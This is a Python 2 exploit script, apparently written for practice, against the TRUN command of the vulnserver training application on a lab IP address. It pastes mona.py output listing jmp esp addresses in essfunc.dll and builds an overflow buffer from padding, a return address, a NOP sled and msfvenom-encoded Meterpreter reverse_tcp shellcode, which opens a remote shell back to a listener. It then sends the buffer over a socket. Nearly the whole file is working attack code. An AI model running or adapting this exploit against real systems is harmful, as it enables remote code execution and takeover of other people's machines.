"""
TRUN .AAAAAAAAAAAAAA
"""

import socket



host = "172.16.253.128"
port = 9999


chunk = 'A'*2006

"""
EIP Data structure !mona jmp -r esp
Log data
0BADF00D   !mona jmp -r esp

           ---------- Mona command started on 2019-05-10 14:43:47 (v2.0, rev 585) ----------
0BADF00D   [+] Processing arguments and criteria
0BADF00D       - Pointer access level : X
0BADF00D   [+] Generating module info table, hang on...
0BADF00D       - Processing modules
0BADF00D       - Done. Let's rock 'n roll.
0BADF00D   [+] Querying 2 modules
0BADF00D       - Querying module essfunc.dll
0BADF00D       - Querying module vulnserver.exe
0BADF00D       - Search complete, processing results
0BADF00D   [+] Preparing output file 'jmp.txt'
0BADF00D       - (Re)setting logfile jmp.txt
0BADF00D   [+] Writing results to jmp.txt
0BADF00D       - Number of pointers of type 'jmp esp' : 9
0BADF00D   [+] Results :
625011AF     0x625011af : jmp esp |  {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (\\vmware-host\Shared Folders\Downloads\vulnserver\essfunc.dll)
625011BB     0x625011bb : jmp esp |  {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (\\vmware-host\Shared Folders\Downloads\vulnserver\essfunc.dll)
625011C7     0x625011c7 : jmp esp |  {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (\\vmware-host\Shared Folders\Downloads\vulnserver\essfunc.dll)
625011D3     0x625011d3 : jmp esp |  {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (\\vmware-host\Shared Folders\Downloads\vulnserver\essfunc.dll)
625011DF     0x625011df : jmp esp |  {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (\\vmware-host\Shared Folders\Downloads\vulnserver\essfunc.dll)
625011EB     0x625011eb : jmp esp |  {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (\\vmware-host\Shared Folders\Downloads\vulnserver\essfunc.dll)
625011F7     0x625011f7 : jmp esp |  {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (\\vmware-host\Shared Folders\Downloads\vulnserver\essfunc.dll)
62501203     0x62501203 : jmp esp | ascii {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (\\vmware-host\Shared Folders\Downloads\vulnserver\essfunc.dll)
62501205     0x62501205 : jmp esp | ascii {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (\\vmware-host\Shared Folders\Downloads\vulnserver\essfunc.dll)
0BADF00D       Found a total of 9 pointers
0BADF00D
0BADF00D   [+] This mona.py action took 0:00:04.848000
"""


# choice one EIP  example 625011DF     0x625011df : jmp esp |  {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (\\vmware-host\Shared Folders\Downloads\vulnserver\essfunc.dll)
# Use by litle Endian "\xdf\x11\x50\x63"


eip = "\xaf\x11\x50\x62"
nops = "\x90" * 32

# msfvenom -p windows/meterpreter/reverse_tcp LHOST=172.16.253.128 LPORT=8000 -e x86/shikata_ga_nai -b "\x00" -f c  -i 2
shellcode = ("\xdd\xc1\xbb\xcc\x9b\xe1\x34\xd9\x74\x24\xf4\x5a\x31\xc9\xb1"
"\x5d\x83\xea\xfc\x31\x5a\x13\x03\x96\x88\x03\xc1\x9c\x5d\xd2"
"\xce\x03\x7b\x0e\xd7\xb7\x58\x45\xb6\x04\x68\x14\x11\x5b\x3c"
"\x44\x9d\xcd\xd3\xe9\x67\x07\x20\xfc\x78\xf9\xb6\x26\x66\xdb"
"\x2f\x8a\x62\x0c\x59\x2b\x20\x8d\xc1\x70\xb9\x62\x42\x76\x0d"
"\x64\x7a\xf6\xda\x25\xf5\xee\xd3\xf7\xaa\x26\x82\x27\x12\xa5"
"\xcf\x2e\x1b\x86\x54\x9e\xb0\xbf\x82\x39\xb2\xcc\x0a\x49\xf4"
"\x41\xe7\x8f\xad\xcc\x82\xb9\x0b\x5b\x8e\x68\xa8\xb5\x31\x10"
"\x97\xa6\xf5\xb3\xe2\x31\x36\x68\x1c\x29\xac\x24\x24\xed\x17"
"\x3b\xd0\x6b\xbb\x98\x10\x67\x90\x0e\x5b\x8e\xbb\x05\x2f\x1d"
"\x8d\x52\xaf\xc5\x70\xce\x03\xb6\xdd\xae\x25\x09\xd0\x0a\x69"
"\x7e\x59\x82\x27\xe5\xc0\x73\xc5\xa5\xc2\x49\x80\x78\x2c\x4b"
"\x12\xa5\x36\xda\x87\x23\x3e\xbb\xb6\x22\x9a\xac\x0f\xf0\x7e"
"\xdd\x20\x4a\x97\xfc\x3e\xb4\x27\x93\xb7\x18\x0e\x8f\xa7\x89"
"\x16\x01\x17\x01\x3e\x33\x7e\xb0\x0d\xb5\xf0\x9f\x63\xdc\x72"
"\xfc\x47\xdd\xfc\x70\xd0\x22\x8d\xf4\x38\x45\xe7\x6d\xbc\xe9"
"\x97\x4b\xd9\xcf\x47\xf3\xf6\xd1\x18\xb4\xc9\xdc\xd6\x3b\x76"
"\xc6\x8e\xa1\xd9\x42\x80\x65\x73\x37\x8a\xa8\xea\x4f\x1b\xc9"
"\x0e\xf7\x85\x39\xfa\xce\xfe\x61\x86\xe1\x3b\x04\xa1\x30\x6b"
"\xae\x4f\x54\x34\x71\x5b\xd8\x72\x2a\x57\x0b\x8d\x6e\x55\x4e"
"\xf6\xe2\x0a\xd9\xe4\xd9\x1f\x90\xe9\x53\x81\x6b\x65\x02\x85"
"\x71\xd7\xa0\xef\x8a\x44\xab\x89\xed\x5d\x88\x5b\x8a\x6c\x4c"
"\xc6\xec\x15\xc5\x63\x8a\x2d\x59\x91\x7c\xd2\x1b\x24\x6e\xbc"
"\x1a\xaa\xe8\x59\x33\x20\x92\x23\xae\x7d\xb4\x21\x59\x59\xc7"
"\x28\x38\x4c\xc6\x5e\x7c\xbd\x4a\x37\xa7\x04\xc9\x46\x86\x24"
"\x89\xd8\x84\xfc\x68\xbd\x62\x5f\x36\x65\x48\x22\xcd\x6b\x2c"
"\x09\x22\xc1\xc5\xcc")

ret =  "C" * (3000 - len(chunk) - len(eip) - len(nops) - len(shellcode))
buffer = chunk + eip + nops + shellcode +ret
try:
	# Create Connection 
	print "[+] Creating Socker Connection"
	sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	sock.connect((host,port))
	

	# Sending Payload
	print "[+] Sending Payload ..."
	print (buffer)
	sock.send('TRUN .'+buffer)
	
	sock.close()

except:
	print "[+] Exploit Failed ..."
	pass